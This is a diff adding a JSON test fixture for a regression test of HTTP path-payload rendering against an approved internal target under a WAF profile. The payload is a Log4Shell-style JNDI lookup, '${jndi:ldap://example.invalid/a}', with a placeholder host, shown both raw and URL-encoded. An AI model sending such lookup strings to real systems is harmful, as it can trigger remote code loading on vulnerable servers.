@@ -1,0 +1,52 @@
+{
+  "schema_version": "1.0",
+  "provenance": {
+    "kind": "non-sensitive-semantically-equivalent",
+    "retained_mc_object_digest": "sha256:b3d23d68d1900b423c44fad10e46823e526e864c84fced9c17539179918c5e40",
+    "retained_execution_id": "execution:5474b2f4-d7a5-4e19-8dbd-6a8adb985df3",
+    "note": "Preserves CT reconstruction of an MC-approved path payload without retaining operational result bytes."
+  },
+  "item": {
+    "input_id": "test-input:path-payload-regression",
+    "input": {
+      "modality": "http-request-template",
+      "method": "GET",
+      "path_key": "inventory-item-detail",
+      "path_payload": "${jndi:ldap://example.invalid/a}",
+      "query": [],
+      "headers": [],
+      "cookies": [],
+      "body": {
+        "state": "absent"
+      }
+    }
+  },
+  "resolver_id": "mc-approved-route-adapter",
+  "profile_id": "waf-standard@2",
+  "profile_digest": "sha256:01f6033b5b09db48056adc8a0d47083f4020cf18d71913c69e283f644ec41a94",
+  "route": {
+    "scheme": "https",
+    "authority": "approved-mc-target.internal",
+    "path": "/inventory/items/42"
+  },
+  "expected_resolution": {
+    "template_id": "test-input:path-payload-regression",
+    "path_key": "inventory-item-detail",
+    "resolver_id": "mc-approved-route-adapter",
+    "profile_id": "waf-standard@2",
+    "resolver_profile_digest": "sha256:01f6033b5b09db48056adc8a0d47083f4020cf18d71913c69e283f644ec41a94",
+    "rendered_request": {
+      "modality": "http-request",
+      "method": "GET",
+      "query": [],
+      "headers": [],
+      "cookies": [],
+      "body": {
+        "state": "absent"
+      },
+      "scheme": "https",
+      "authority": "approved-mc-target.internal",
+      "path": "/inventory/items/42/%24%7Bjndi%3Aldap%3A%2F%2Fexample.invalid%2Fa%7D"
+    }
+  }
+}
